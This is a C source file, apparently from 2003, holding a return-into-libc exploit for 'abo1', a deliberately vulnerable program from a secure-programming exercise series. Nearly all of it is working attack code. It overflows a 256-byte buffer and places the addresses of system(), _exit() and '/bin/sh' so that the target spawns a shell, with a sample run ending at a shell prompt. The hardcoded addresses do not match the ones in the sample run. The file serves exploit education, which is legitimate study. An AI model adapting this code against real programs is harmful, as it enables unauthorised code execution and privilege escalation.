/*
 *  * $Id: abo1-ex6.c,v 1.1 2003/11/08 16:20:14 raptor Exp $
 *   *
 *    * abo1-ex5.c - abo1.c exploit, for educational purposes
 *     * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *      *
 *       * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *        *
 *         * Another classic return-into-libc exploit (/bin/sh string is from libc).
 *          *
 *           * $ uname -a
 *            * Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
 *             * $ gcc --version
 *              * 2.95.4
 *               * $ ./abo1-ex6
 *                * Using system() address  : 0x4005f590
 *                 * Using _exit() address   : 0x400bae90
 *                  * Using /bin/sh address   : 0x4012276d
 *                   *
 *                    * sh-2.05a$
 *                     */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./abo1"	// this is the path to the vulnerable program
#define	BUF	273		// evil buffer size: (256 + 4) + (4 * 3) + 1
#define	SYSTEM	0xf7e50190	// http://0xdeadbeef.info/code/libc-search.c
#define EXIT	0xf7ec5bc4	// http://0xdeadbeef.info/code/libc-search.c
#define SHELL	0xf7f70a24	// http://0xdeadbeef.info/code/libc-search.c

int main(int argc, char **argv)
{
  char	buf[BUF];
  char	*p = buf;

  /* fill the vulnerable buffer */
  memset(p, 'A', (256 + 4));
  p += (256 + 4);

  /* prepare the stack */
  *((void **)p) = (void *)(SYSTEM);	/* system() address in libc */
  p += 4;
  *((void **)p) = (void *)(EXIT);		/* _exit() address in libc */ 	
  p += 4;
  *((void **)p) = (void *)(SHELL); 	/* /bin/sh address in libc */
  p += 4;
  *p = 0x0;				/* terminate with NULL-byte */

  /* print some output */
  fprintf(stderr, "Using system() address\t: %p\n", SYSTEM);
  fprintf(stderr, "Using _exit() address\t: %p\n", EXIT);
  fprintf(stderr, "Using /bin/sh address\t: %p\n\n", SHELL);

  /* run the vulnerable program */
  execl(VULN, VULN + 2, buf, NULL);
  perror("execl");
}

